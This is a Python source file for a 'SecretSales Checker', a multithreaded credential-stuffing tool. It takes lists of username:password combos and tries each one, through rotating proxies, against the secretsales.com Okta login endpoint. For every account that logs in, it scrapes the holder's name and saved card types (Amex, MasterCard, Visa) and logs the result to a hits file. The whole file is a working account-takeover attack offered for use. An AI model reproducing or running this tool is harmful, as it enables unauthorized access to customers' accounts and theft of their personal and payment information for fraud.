from concurrent.futures import thread
import requests,time,math,config,json,random
from threading import Thread
from colorama import init, Fore
from os import system
import datetime
import requests
from http.cookies import SimpleCookie
from pyquery import PyQuery   
import hashlib

syslogo = r"""

 ___  ____  ___  ____  ____  ____    ___    __    __    ____  ___ 
/ __)( ___)/ __)(  _ \( ___)(_  _)  / __)  /__\  (  )  ( ___)/ __)
\__ \ )__)( (__  )   / )__)   )(    \__ \ /(__)\  )(__  )__) \__ \
(___/(____)\___)(_)\_)(____) (__)   (___/(__)(__)(____)(____)(___/


"""
hits = 0
invalid = 0
cns = 0


def createJSON(threads):
    jsonObj = {"lines":0}
    for i in range(1,threads+1):jsonObj[str(i)] = ''
    
    json_object = json.dumps(jsonObj, indent=4)
    with open("files/lastSession.json", "w") as outfile:outfile.write(json_object)
    return jsonObj


def readJSON():
    try:
        with open("files/lastSession.json", "r+") as outfile:
            data = json.load(outfile)
    except: data = {}
    return data

lastSessionJSON = readJSON()

def updateJSON(jsonObj):
    try:json_object = json.dumps(jsonObj, indent=4)
    except:json_object = jsonObj
    
    with open("files/lastSession.json", "w") as outfile:outfile.write(json_object)

def SecretSalesSession(data,proxy):
    class Client:
        def __init__(self,username,password,proxy) -> None:
            proxies = {'http': proxy,'https':proxy}
            rsession = requests.Session()
            if config.proxies != False:rsession.proxies.update(proxies)
            self.sesh = rsession
            self.username = str(username)
            self.password = str(password)


        def checkSub(self):
            USER = self.username
            PASS = self.password


            starter = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" ,
                "Pragma": "no-cache", 
                "Accept": "*/*" 
            }

            response = self.sesh.get("https://my.secretsales.com/",headers=starter)

            authn = {
                'Content-type':"application/json" ,
                "Host": "my.secretsales.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                "Accept": "application/json",
                "Accept-Language": "en",
                "Accept-Encoding": "gzip, deflate, br",
                "content-type": "application/json",
                "x-okta-user-agent-extended": "okta-signin-widget-3.3.3",
                "Origin": "https://my.secretsales.com",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Pragma": "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace",
            }



            data = {
                "password":PASS,
                "username":USER,
                "options": {
                    "warnBeforePasswordExpired":True, 
                    "multiOptionalFactorEnroll":True
                    },
                "stateToken":""

            }

            response = self.sesh.post("https://my.secretsales.com/api/v1/authn",json=data)
            if config.debug == True: print(response.json())


            try:SESSIONTOKEN = response.json()['sessionToken']
            except:return False
            profile = response.json()['_embedded']['user']['profile']

            firstName,lastName = profile['firstName'],profile['lastName']


            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'en-US,en;q=0.9,pl-PL;q=0.8,pl;q=0.7,de;q=0.6',
                'Connection': 'keep-alive',
                'Referer': 'https://my.secretsales.com/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

            params = {
                'checkAccountSetupComplete': 'true',
                'token': SESSIONTOKEN,
                'redirectUrl': 'https://my.secretsales.com',
            }

            response = self.sesh.get('https://my.secretsales.com/login/sessionCookieRedirect', params=params, headers=headers)



            headers = {
                'authority': 'www.secretsales.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'pl-PL,pl;q=0.6',
                'referer': 'https://www.secretsales.com/stripe/customer/paymentmethods/',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Brave";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            }

            response = self.sesh.get('https://www.secretsales.com/customer/account/index/okta_location/login/', headers=headers)


            headers = {
                'authority': 'www.secretsales.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'pl-PL,pl;q=0.6',
                'cache-control': 'max-age=0',
                'referer': 'https://www.secretsales.com/customer/account/index/okta_location/login/',
                'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Brave";v="108"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            }

            response = self.sesh.get('https://www.secretsales.com/stripe/customer/paymentmethods/', headers=headers)

            with open('ddd.html' , 'w', encoding='utf-8') as raw: raw.write(response.text)

            pq = PyQuery(response.text)
            hpM = pq('table#my-orders-table > tbody').html()
            if hpM == None:return 'NO PAYMENT METHOD'
            data = [True,firstName,lastName]
            for typ in ['Amex','MasterCard','Visa']:
                if typ.lower() in hpM:
                    data.append(typ)

            return data



    try:username,password = data.strip().split(config.delimiter)
    except:
        return 'WRONG COMBO'
    try:
        client = Client(username,password,proxy)
        if config.debug == True:print(Fore.YELLOW, f'Client for {data} created',Fore.RESET)
        result = client.checkSub()
    except Exception as exc:
        print(exc)
        result = 'ERROR'
    if config.debug == True:print(Fore.YELLOW, f"{data}|VALID:{result}",Fore.RESET)
    return result


def Controller(users,proxies,thread_id):
    global hits
    global invalid
    global syslogo
    global lastSessionJSON
    global cns
    count,proxy_count = 0,0
    while count < len(users):
        USER = users[count]
        if config.user_pass_proxy_address != '':
            PROXY = config.user_pass_proxy_address
        else:
            try:
                #PROXY = proxies[proxy_count]
                PROXY = random.choice(proxies)
            except:
                proxy_count = 0
                continue
        if 'http' not in PROXY: PROXY = 'http://'+PROXY
        if config.debug == True:print(Fore.YELLOW,USER,PROXY ,'started',Fore.RESET)
        try:result = SecretSalesSession(USER,PROXY)
        except Exception as exc:
            print(USER,PROXY)
            print(exc, result)
            continue
        if result == 'WRONG COMBO':
            print(f'{Fore.RED} [-] {USER} WRONG COMBO {Fore.RESET}')
        
        if result in ['ERROR','TIMEOUT']:
            if config.debug == True:print(f'{Fore.BLUE} [{result}] {USER} {PROXY} {Fore.RESET}')
            if config.debug == True:print(Fore.BLUE,USER,'proxy Timeout',Fore.RESET)
            cns+=1
            continue
        elif result == False:
            invalid+=1
            print(f'{Fore.RED} [-] {USER} {Fore.RESET}')
        elif result[0] == True or result == 'NO PAYMENT METHOD':
            hits+=1
            print(f'{Fore.GREEN} [+] {USER} {Fore.RESET}')
            if result == 'NO PAYMENT METHOD':
                methods = 'NO PAYMENT METHOD'
            else:
                methods = ', '.join(result[3:])
            fn,ln = result[1],result[2]
            with open(f"{config.filesFolder}/hits.txt", 'a+') as raw:raw.write(f"{USER} | FN: {fn} | LN: {ln} | PMS: {methods}\n")    
        if config.debug == True:print(Fore.YELLOW,USER,'finished',Fore.RESET)
        lastSessionJSON[str(thread_id)] = USER
        
    
        count+=1
        #proxy_count+=1



def struct(th,file,de=None):
    global lastSessionJSON
    
    with open(file, "r+",encoding="utf8",errors='ignore') as f:l = [p.strip() for p in f.readlines()]
    amount = int(math.ceil(len(l) / th))
    l = [
        l[x : x + amount] for x in range(0, len(l), amount)
    ]
    if len(l) % th > 0.0:
        l[len(l) - 1].append(l[len(l) - 1])
    if  de.lower() == 'c':
        jsonObj = readJSON()
        for key in jsonObj:
            if key == 'lines':continue
            if jsonObj[key] == '':
                ind = -1
            else:
                ind = l[int(key)-1].index(jsonObj[key])
            l[int(key)-1] = l[int(key)-1][ind+1:]
    else:
        lastSessionJSON = createJSON(int(th))
    

    return l

    

def setup(number_threads,de):
    thread_count = float(number_threads)
    with open(f"{config.filesFolder}/{config.proxyFile}", "r+") as f: proxies_list = [p.strip() for p in f.readlines()]
    user_list =  struct(thread_count,f"{config.filesFolder}/{config.usersFile}",de)
    if len(proxies_list) == 0: proxies_list = ['PROXY' for x in range(0,len(user_list))]
    return proxies_list,user_list

def runner(): 
    global hits
    global invalid
    global cpm 
    global lastSessionJSON
    global cns
    with open('files/users.txt', "r+",encoding="utf8",errors='ignore') as f: all = len(f.readlines())

    while True: 
        oldchecked = hits + invalid 
        time.sleep(1) 
        newchecked = invalid + hits 
        cpm = (newchecked - oldchecked) * 60 
        lastSessionJSON['lines']= newchecked
        updateJSON(lastSessionJSON)
        log = f"SecretSales Checker - Hits: {hits}  Invalid: {invalid}  Remaining: {lastSessionJSON['lines']}/{all} CPM: {str(cpm)} CNS: {cns}"
        system("title " + log)
        try:
            if newchecked >= all:
                break
        except Exception as exc:
            print(exc)
        
        #print(log)
        
        
 
def main(threads,de):
    proxies_list,user_list = setup(threads,de)
    thread_list = []
    count = 0
    thread_list.append(Thread(target=runner))
    thread_list[0].start()

    for i in range(0,len(user_list)):
        thread_list.append(Thread(target=Controller, args=([user_list[i],proxies_list,i+1])))
        thread_list[len(thread_list) - 1].start()
        time.sleep(0.05)
        count += 1


    for x in thread_list:
        x.join()
system("title " + 'SecretSales Checker')

print(Fore.YELLOW + syslogo + Fore.RESET)
de = input('\nDo you want to restart or continue (R/C):\n - ')
if de.lower() == 'c':
    try:
        th = max([int(x) for x in list(lastSessionJSON.keys()) if x != 'lines'])
    except:
        print('NO PREVIOUS SESSION FOUND\n')
        de = 'r'
        if input('Do you want to clear the current output files? (Y)es/(N)o\n: - ').lower() == 'y':
            with open('files/hits.txt','w') as raw:raw.write('')
        th = int(input('Input thread amount:\n - '))
    
else:
    if input('Do you want to clear the current output files? (Y)es/(N)o\n: - ').lower() == 'y':
        with open('files/hits.txt','w') as raw:raw.write('')
    th = int(input('Input thread amount:\n - '))
print("\n")
main(th,de)


print('FINISHED')
input()
#quit()



